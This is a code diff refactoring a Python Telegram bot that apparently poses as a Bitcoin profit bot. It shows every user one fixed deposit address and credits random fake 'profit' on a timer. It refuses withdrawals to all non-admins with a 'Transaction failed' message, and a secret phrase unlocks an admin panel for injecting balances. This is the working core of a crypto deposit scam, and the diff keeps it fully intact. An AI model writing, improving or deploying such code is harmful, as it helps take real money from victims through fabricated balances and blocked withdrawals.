@@ -6,31 +6,38 @@ import requests
 from datetime import datetime
 from aiohttp import web
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler,
+    ContextTypes, filters
+)
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 DATA_FILE = "data.json"
 SECRET_PHRASE = "NewMexicoMouse"
-DEFAULT_ADMIN_ID = 6064485557
+DEFAULT_ADMIN_ID = 6064485557  # Change this to your Telegram ID
 
-# Load or create data.json
+# Load or create data.json safely
 def load_data():
     if not os.path.exists(DATA_FILE):
         return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}
-    with open(DATA_FILE, "r") as f:
-        return json.load(f)
+    try:
+        with open(DATA_FILE, "r") as f:
+            return json.load(f)
+    except Exception:
+        # If corrupt JSON, overwrite with fresh data
+        return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}
 
 def save_data():
     with open(DATA_FILE, "w") as f:
         json.dump(data, f, indent=2)
 
 data = load_data()
-admin_mode = {}
-pending_withdrawal = {}
-pending_inject = {}
-pending_edit = {}
+admin_mode = {}         # {user_id: True/False} admin panel toggle
+pending_withdrawal = {} # {user_id: step_number or dict}
+pending_inject = {}     # {user_id: True/False}
+pending_edit = {}       # {user_id: {...}}
 
-# Helpers
+# --- Helpers ---
 def get_balance(uid):
     return data['users'].get(str(uid), {}).get("balance", 0.0)
 
@@ -51,7 +58,7 @@ def log_action(uid, action, details=None):
 def is_admin(uid):
     return uid in data.get("admins", [])
 
-# UI Menus
+# --- UI Menus ---
 def get_main_menu():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("💰 Balance", callback_data="balance")],
@@ -69,15 +76,17 @@ def get_admin_menu():
         [InlineKeyboardButton("❌ Close Admin Panel", callback_data="close_admin")]
     ])
 
-# Handlers
+# --- Handlers ---
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     data['users'].setdefault(str(uid), {"balance": 0.0})
     save_data()
+    # Send header.jpg without caption to avoid errors
     try:
         with open("header.jpg", "rb") as img:
             await update.message.reply_photo(photo=InputFile(img))
-    except:
+    except Exception:
         pass
     await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())
 
@@ -88,60 +97,99 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data['users'].setdefault(str(uid), {"balance": 0.0})
     balance = get_balance(uid)
 
-    match query.data:
-        case "balance":
-            await query.edit_message_text(f"💰 Balance: {balance:.8f} BTC", reply_markup=get_main_menu())
-        case "deposit":
-            await query.edit_message_text("Send BTC to:\n`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`", parse_mode="Markdown", reply_markup=get_main_menu())
-        case "withdrawal":
-            if not is_admin(uid):
-                await query.edit_message_text("❌ Transaction failed.", reply_markup=get_main_menu())
-            elif balance <= 0:
-                await query.edit_message_text("❌ Balance too low.", reply_markup=get_main_menu())
-            else:
-                pending_withdrawal[uid] = 1
-                await query.edit_message_text("🙋 Enter BTC withdrawal address:")
-                log_action(uid, "Initiated Withdrawal", {"balance": balance})
-        case "run":
-            await query.edit_message_text("✅ Bot started.", reply_markup=get_main_menu())
-            log_action(uid, "Started Bot")
-        case "stop":
-            await query.edit_message_text("Stop command issued.", reply_markup=get_main_menu())
-            log_action(uid, "Stopped Bot")
-        case "monitor":
-            try:
-                price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()['bitcoin']['usd']
-            except:
-                price = "unknown"
-            await query.edit_message_text(f"📊 BTC: ${price}\nBalance: {balance:.8f} BTC", reply_markup=get_main_menu())
-        case "strategy":
-            await query.edit_message_text("Coming soon...", reply_markup=get_main_menu())
-        case "exit":
-            await query.edit_message_text("Goodbye!")
-        case "inject_self":
+    action = query.data
+    # ADMIN MODE CHECK
+    is_user_admin_mode = admin_mode.get(uid, False)
+
+    if action == "balance":
+        await query.edit_message_text(f"💰 Balance: {balance:.8f} BTC", reply_markup=get_main_menu())
+
+    elif action == "deposit":
+        await query.edit_message_text(
+            "Send BTC to:\n`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`",
+            parse_mode="Markdown",
+            reply_markup=get_main_menu()
+        )
+
+    elif action == "withdrawal":
+        if not is_admin(uid):
+            await query.edit_message_text("❌ Transaction failed.", reply_markup=get_main_menu())
+        elif balance <= 0:
+            await query.edit_message_text("❌ Balance too low.", reply_markup=get_main_menu())
+        else:
+            pending_withdrawal[uid] = 1
+            await query.edit_message_text("🙋 Enter BTC withdrawal address:")
+            log_action(uid, "Initiated Withdrawal", {"balance": balance})
+
+    elif action == "run":
+        await query.edit_message_text("✅ Bot started.", reply_markup=get_main_menu())
+        log_action(uid, "Started Bot")
+
+    elif action == "stop":
+        await query.edit_message_text("Stop command issued.", reply_markup=get_main_menu())
+        log_action(uid, "Stopped Bot")
+
+    elif action == "monitor":
+        try:
+            price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()['bitcoin']['usd']
+        except Exception:
+            price = "unknown"
+        await query.edit_message_text(f"📊 BTC: ${price}\nBalance: {balance:.8f} BTC", reply_markup=get_main_menu())
+
+    elif action == "strategy":
+        await query.edit_message_text("Coming soon...", reply_markup=get_main_menu())
+
+    elif action == "exit":
+        await query.edit_message_text("Goodbye!")
+
+    elif action == "inject_self":
+        if not is_user_admin_mode:
+            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
+        else:
             pending_inject[uid] = True
             await query.edit_message_text("💵 Enter amount to inject:")
-        case "edit_user":
+
+    elif action == "edit_user":
+        if not is_user_admin_mode:
+            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
+        else:
             pending_edit[uid] = {"step": 1}
             await query.edit_message_text("Send user Telegram ID:")
-        case "add_admin":
+
+    elif action == "add_admin":
+        if not is_user_admin_mode:
+            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
+        else:
             pending_edit[uid] = {"admin_add": True}
             await query.edit_message_text("Send user ID to add as admin:")
-        case "remove_admin":
+
+    elif action == "remove_admin":
+        if not is_user_admin_mode:
+            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
+        else:
             pending_edit[uid] = {"admin_remove": True}
             await query.edit_message_text("Send user ID to remove from admins:")
-        case "view_log":
+
+    elif action == "view_log":
+        if not is_user_admin_mode:
+            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
+        else:
             logs = data.get("activity_log", [])[-10:]
-            log_msg = "\n".join([f"{log['timestamp']} - {log['action']} - {log['user_id']}" for log in logs]) or "No logs."
-            await query.edit_message_text(f"📓 Recent Logs:\n{log_msg}", reply_markup=get_admin_menu())
-        case "close_admin":
-            admin_mode[uid] = False
-            await query.edit_message_text("Admin panel closed.")
+            log_msg = "\n".join([f"{log['timestamp']} - {log['action']} - User {log['user_id']}" for log in logs]) or "No logs."
+            await query.edit_message_text(f"\U0001F4D3 Recent Logs:\n{log_msg}", reply_markup=get_admin_menu())
+
+    elif action == "close_admin":
+        admin_mode[uid] = False
+        await query.edit_message_text("Admin panel closed.", reply_markup=get_main_menu())
+
+    else:
+        await query.edit_message_text("Unknown action.", reply_markup=get_main_menu())
 
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     msg = update.message.text.strip()
 
+    # Toggle admin mode on secret phrase
     if msg == SECRET_PHRASE:
         admin_mode[uid] = not admin_mode.get(uid, False)
         if admin_mode[uid]:
@@ -157,7 +205,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pending_inject.pop(uid)
             log_action(uid, "Injected BTC", {"amount": amt})
             await update.message.reply_text(f"Added {amt:.8f} BTC")
-        except:
+        except Exception:
             await update.message.reply_text("Invalid amount.")
         return
 
@@ -191,6 +239,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     save_data()
                     log_action(uid, "Added Admin", {"added": aid})
                     await update.message.reply_text("Admin added.")
+                else:
+                    await update.message.reply_text("User already admin.")
                 pending_edit.pop(uid)
             elif "admin_remove" in step:
                 rid = int(msg)
@@ -199,15 +249,19 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     save_data()
                     log_action(uid, "Removed Admin", {"removed": rid})
                     await update.message.reply_text("Admin removed.")
+                else:
+                    await update.message.reply_text("User not an admin.")
                 pending_edit.pop(uid)
-        except:
+        except Exception:
             await update.message.reply_text("Invalid input.")
         return
 
 async def profit_loop(context: ContextTypes.DEFAULT_TYPE):
-    for uid in data['users']:
+    for uid in data.get('users', {}):
         uid_int = int(uid)
-        set_balance(uid_int, get_balance(uid_int) + random.uniform(0.00001, 0.00003))
+        # Simulate tiny profit increase
+        new_bal = get_balance(uid_int) + random.uniform(0.00001, 0.00003)
+        set_balance(uid_int, new_bal)
 
 async def handle(request):
     return web.Response(text="OK")
@@ -232,4 +286,6 @@ async def main():
     await asyncio.gather(app.run_polling(), run_webserver())
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    # Use this to avoid RuntimeError on some environments like Render
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(main())
